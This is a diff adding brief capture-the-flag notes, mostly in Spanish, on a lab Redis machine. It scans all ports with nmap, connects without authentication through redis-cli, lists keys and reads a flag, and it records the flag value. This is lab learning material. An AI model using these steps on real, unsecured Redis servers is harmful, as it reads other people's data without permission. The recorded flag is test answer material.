@@ -1,0 +1,24 @@
+nmap -p- -sV 10.129.11.2
+
+redis-cli -h 10.129.11.2
+
+si le damos al comando info, nos devolverá mucha informacion, de la cual nos quedamos con esto:
+redis_version:5.0.7
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:66bd629f924ac924
+# Keyspace
+db0:keys=4,expires=0,avg_ttl=0
+
+The keyspace section provides statistics on the main dictionary of each database. The statistics include the
+number of keys, and the number of keys with an expiration.
+In our case, under the Keyspace section, we can see that only one database exists with index 0 .
+
+Para seleccionar la base de datos (en este caso es la 0) usamos:
+select 0
+Una vez lo seleccionamos, podemos usar el comando:
+keys *
+y nos mostrará todas las keys que tiene esta base de datos
+Luego usamos un get seguido de la key para obtener el valor.
+
+flag: 03e1d2b376c37ab3f5319922053953eb
